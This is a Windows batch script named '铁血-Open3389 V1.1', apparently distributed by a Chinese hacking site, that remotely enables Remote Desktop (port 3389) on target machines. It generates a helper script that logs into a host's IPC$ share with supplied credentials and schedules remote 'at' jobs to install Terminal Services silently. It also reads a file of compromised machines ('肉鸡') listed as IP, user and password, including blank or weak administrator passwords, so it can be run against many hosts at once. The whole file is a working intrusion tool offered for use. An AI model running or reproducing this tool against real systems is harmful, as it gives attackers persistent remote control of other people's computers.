@echo off
color 3e 
cls

Rem ==========================以下是ipc.bat的内容====================================
echo @echo off  >ipc.bat
echo echo.    >>ipc.bat
echo echo 正在连接%%1...    >>ipc.bat
echo echo.    >>ipc.bat
echo net use \\%%1\ipc$ %%3 /user:%%2 ^& IF errorlevel 1 goto :Error    >>ipc.bat
echo echo 正在查询%%1的当前时间    >>ipc.bat
echo echo.    >>ipc.bat
echo net time \\%%1 /set /y ^& IF errorlevel 1 goto :Error    >>ipc.bat
echo for /f "tokens=1,2 delims=:"  %%%%i in ("%%time%%") do set /a hh=%%%%i ^& set /a mm=%%%%j    >>ipc.bat
echo echo %%1当前时间为%%hh%%:%%mm%%    >>ipc.bat
echo set /a mm=%%mm%%+1    >>ipc.bat
echo if /i %%mm%% geq 60 set /a mm=0 ^& set /a hh=%%hh%%+1    >>ipc.bat
echo if /i %%hh%% geq 24 set /a hh=0    >>ipc.bat
echo set tm=%%hh%%:%%mm%%    >>ipc.bat
echo echo.    >>ipc.bat
echo echo 设置启动3389服务的时间为%%tm%%    >>ipc.bat
echo echo.    >>ipc.bat
echo at \\%%1 %%tm%% cmd /c echo [Components] ^^^> syslog  ^& IF errorlevel 1 goto :Error    >>ipc.bat
echo echo.    >>ipc.bat
echo at \\%%1 %%tm%% cmd /c echo TSEnable = on ^^^>^^^> syslog  ^& IF errorlevel 1 goto :Error    >>ipc.bat
echo echo.    >>ipc.bat
echo at \\%%1 %%tm%% sysocmgr /i:c:\winnt\inf\sysoc.inf /u:c:\winnt\system32\syslog /q  ^& IF errorlevel 1 goto :Error    >>ipc.bat
echo echo.    >>ipc.bat
echo echo 最多再过60秒，3389服务就会被启动，请稍侯...    >>ipc.bat
echo echo.  >>ipc.bat
echo echo 对方正准备重启，请等待对方重器后，3389服务才会生效...   >>ipc.bat
echo goto :BYE    >>ipc.bat
echo :Error    >>ipc.bat
echo echo.    >>ipc.bat
echo net use \\%%1\ipc$ /del /y    >>ipc.bat
echo echo %%1出现错误，命令不能成功完成！    >>ipc.bat
echo echo.    >>ipc.bat
echo goto :exit    >>ipc.bat
echo :BYE    >>ipc.bat
echo echo.    >>ipc.bat
echo net use \\%%1\ipc$ /del /y    >>ipc.bat
echo echo %%1成功完成所有命令    >>ipc.bat
echo echo.    >>ipc.bat
echo :exit    >>ipc.bat
echo echo ------------------------------------------------------    >>ipc.bat
echo exit   >>ipc.bat
Rem ======================================完======================================


if {%1}== {} goto :Usage
if {%2}== {} goto :file
if {%3}== {} goto :Usage
if not {%3}== {} goto :open

:File
echo ======================================================
echo                 铁血-Open3389 V1.1          
echo ======================================================
if not exist %1 echo 指定文件不存在! & pause & goto  Usage
for /f "tokens=1-3 delims= "  %%i in (%1) do  start /b /wait ipc.bat %%i %%j %%k
goto exit

:Open
echo ======================================================
echo                 铁血-Open3389 V1.1       
echo ======================================================
start /b /wait ipc.bat %1 %2 %3
goto exit


:Usage
cls
echo ======================================================
echo                 铁血-Open3389 V1.1    
echo            Download by  小凤居    ChineseHack.org       
echo ======================================================
echo 完全用批处理写的远程开启3389服务的工具。不依赖管理共享了。
echo 作者：铁血
echo 主页：http://txhak.myrice.com/
echo 邮箱：txhak@etang.com
echo QQ:   22540685
echo tx3389.bat [IP] [用户名] [密码]
echo tx3389.bat [肉鸡文件]
echo 如果指定肉鸡文件批处理将从文件中读取ip 用户名 密码
echo 肉鸡文件的文件格式为ip 用户名 密码。空格隔开。
echo 例1：tx3389 192.168.0.2 user "" 
echo 例2：tx3389 file.txt
echo 肉鸡文件格式如下（空格隔开）：
echo 192.168.0.1 user ""
echo 192.168.0.2 administrator 123
echo 192.168.0.24 administrator admin
echo ------------------------------------------------------

:exit